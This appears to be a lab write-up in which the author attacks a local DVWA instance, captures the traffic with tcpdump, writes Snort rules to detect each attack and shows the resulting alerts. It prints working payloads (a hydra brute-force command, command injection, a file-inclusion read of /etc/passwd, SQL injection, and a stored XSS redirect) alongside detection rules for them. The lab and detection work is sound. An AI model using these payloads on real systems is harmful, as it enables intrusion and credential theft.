# Part 1

## Step 1: Generating the PCAP

### Running DVWA

Run DVWA Using:

```bash
docker compose up -d dvwa
```

### Running `tcpdump`

To generate the pcap files, I use:

```bash
sudo tcpdump -i dvwa-br -w dvwa-attacks.pcap
```

### Doing the Attacks

#### Brute Force

``` bash
hydra -l admin \
-P /usr/share/dict/rockyou.txt \
-t 4 -f localhost http-get-form \
"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=COOKIE_HERE; security=medium:F=password incorrect"
```

:::info
Obtain the cookie `PHPSESSID` in:

`F12` → Application → Cookies(DropDown) → `https://localhost` → `PHPSESSID`
:::

#### Command Injection

``` bash
127.0.0.1 | uname -son
```

#### File Inclusion

`http://localhost/vulnerabilities/fi/?page=/etc/passwd`

#### SQL Injection

``` sql
1 OR 1=1
```

#### XSS (Stored)

``` js
<ScRiPt>window.location.href=atob('aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ==')</sCRiPT>
```

#### JavaScript Attacks

`http://localhost/vulnerabilities/javascript/source/medium.js`

``` js
// this just reverses
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
setTimeout(function () {
    do_elsesomething("XX")
}, 300);

function do_elsesomething(e) {
    document.getElementById("phrase").value + "XX")
}
```

* Set phrase into "token"
* run `document.getElementById("token").value = "XXsseccusXX";` in console
* submit :3

## Step 2: Running snort

After we generated the pcap file, now we can configure snort.

### Configuring Snort

#### Getting `OINKCODE`

Generate oinkcode from oinkcode [official website](https://snort.org/documents/how-to-find-and-use-your-oinkcode). and place it in `.env` file with format:

```env
OINKCODE=xxx
```

#### Using our specific rules

add this to `data/rules/local.rules`

```txt
# Brute Force: rapid GET requests to login endpoint (raw payload, no stream required)
alert tcp any any -> any 80 (msg:"DVWA Brute Force Login Attempt"; content:"GET /vulnerabilities/brute/"; content:"username="; threshold:type both,track by_src,count 4,seconds 10; sid:1000001; rev:3;)

# Command Injection: pipe character in exec POST body (raw "|" byte or URL-encoded "%7C")
alert tcp any any -> any 80 (msg:"DVWA Command Injection Pipe"; content:"POST /vulnerabilities/exec/"; content:"ip="; pcre:"/(\x7c|%7c)/i"; sid:1000002; rev:3;)

# File Inclusion: /etc/passwd in fi page parameter
alert tcp any any -> any 80 (msg:"DVWA File Inclusion /etc/passwd"; content:"/vulnerabilities/fi/"; content:"/etc/passwd"; sid:1000003; rev:2;)

# SQL Injection: OR 1=1 pattern in sqli request (raw "1=1" or URL-encoded "1%3D1")
alert tcp any any -> any 80 (msg:"DVWA SQL Injection OR 1=1"; content:"/vulnerabilities/sqli/"; content:"OR"; nocase; pcre:"/1\s*(=|%3d)\s*1/i"; sid:1000004; rev:3;)

# XSS Stored/Reflected: mixed-case script tag, raw "<script" or URL-encoded "%3Cscript"
alert tcp any any -> any 80 (msg:"DVWA XSS Script Tag"; content:"/vulnerabilities/xss_"; pcre:"/(<|%3c)script/i"; sid:1000005; rev:3;)

# XSS Stored/Reflected: atob() base64 redirect payload, raw "atob(" or URL-encoded "atob%28"
alert tcp any any -> any 80 (msg:"DVWA XSS atob Redirect"; content:"/vulnerabilities/xss_"; pcre:"/atob(\(|%28)/i"; sid:1000006; rev:3;)

# JavaScript: direct source file access
alert tcp any any -> any 80 (msg:"DVWA JavaScript Source File Access"; content:"/vulnerabilities/javascript/source/"; sid:1000007; rev:2;)
```

### Replay the pcap to snort

After we generate the pcap and snort is configured, we can finally run snort using the command:

```sh
docker run --rm \
        --env-file .env \
        -v "$(pwd)/snort.conf:/etc/snort/snort.conf" \
        -v "$(pwd)/data/rules:/etc/snort/rules" \
        -v "$(pwd)/data/logs/test:/var/log/snort" \
        -v "$(pwd)/dvwa-attacks.pcap:/pcap/dvwa-attacks.pcap:ro" \
        part-1-snort \
        snort -A console -k none -c /etc/snort/snort.conf -r /pcap/dvwa-attacks.pcap -l /var/log/snort
```

After we done that we can detect our attacks

```log
+-----------------------[filtered events]--------------------------------------
| gen-id=1      sig-id=1000001    type=Both      tracking=src count=4   seconds=10  filtered=3
06/02-00:32:54.478778  [**] [1:1000001:3] DVWA Brute Force Login Attempt [**] [Priority: 0] {TCP} 172.21.0.1:38586 -> 172.21.0.3:80
06/02-00:33:20.570275  [**] [1:1000002:3] DVWA Command Injection Pipe [**] [Priority: 0] {TCP} 172.21.0.1:38432 -> 172.21.0.3:80
06/02-00:33:45.492046  [**] [1:1000003:2] DVWA File Inclusion /etc/passwd [**] [Priority: 0] {TCP} 172.21.0.1:42986 -> 172.21.0.3:80
06/02-00:33:57.886921  [**] [1:1000003:2] DVWA File Inclusion /etc/passwd [**] [Priority: 0] {TCP} 172.21.0.1:34212 -> 172.21.0.3:80
06/02-00:34:11.123596  [**] [1:1000004:3] DVWA SQL Injection OR 1=1 [**] [Priority: 0] {TCP} 172.21.0.1:56004 -> 172.21.0.3:80
06/02-00:34:49.373510  [**] [1:1000005:3] DVWA XSS Script Tag [**] [Priority: 0] {TCP} 172.21.0.1:35478 -> 172.21.0.3:80
06/02-00:34:59.961100  [**] [1:1000006:3] DVWA XSS atob Redirect [**] [Priority: 0] {TCP} 172.21.0.1:38956 -> 172.21.0.3:80
06/02-00:34:59.961100  [**] [1:1000005:3] DVWA XSS Script Tag [**] [Priority: 0] {TCP} 172.21.0.1:38956 -> 172.21.0.3:80
06/02-00:35:21.604366  [**] [1:1000006:3] DVWA XSS atob Redirect [**] [Priority: 0] {TCP} 172.21.0.1:41058 -> 172.21.0.3:80
06/02-00:35:21.604366  [**] [1:1000005:3] DVWA XSS Script Tag [**] [Priority: 0] {TCP} 172.21.0.1:41058 -> 172.21.0.3:80
06/02-00:35:46.727577  [**] [1:1000005:3] DVWA XSS Script Tag [**] [Priority: 0] {TCP} 172.21.0.1:37504 -> 172.21.0.3:80
06/02-00:35:46.769843  [**] [1:1000007:2] DVWA JavaScript Source File Access [**] [Priority: 0] {TCP} 172.21.0.1:37504 -> 172.21.0.3:80
06/02-00:36:02.915222  [**] [1:1000007:2] DVWA JavaScript Source File Access [**] [Priority: 0] {TCP} 172.21.0.1:53944 -> 172.21.0.3:80
06/02-00:36:21.097786  [**] [1:1000007:2] DVWA JavaScript Source File Access [**] [Priority: 0] {TCP} 172.21.0.1:34900 -> 172.21.0.3:80
06/02-00:36:25.925135  [**] [1:1000007:2] DVWA JavaScript Source File Access [**] [Priority: 0] {TCP} 172.21.0.1:34900 -> 172.21.0.3:80
06/02-00:36:42.820998  [**] [1:1000007:2] DVWA JavaScript Source File Access [**] [Priority: 0] {TCP} 172.21.0.1:32962 -> 172.21.0.3:80
```
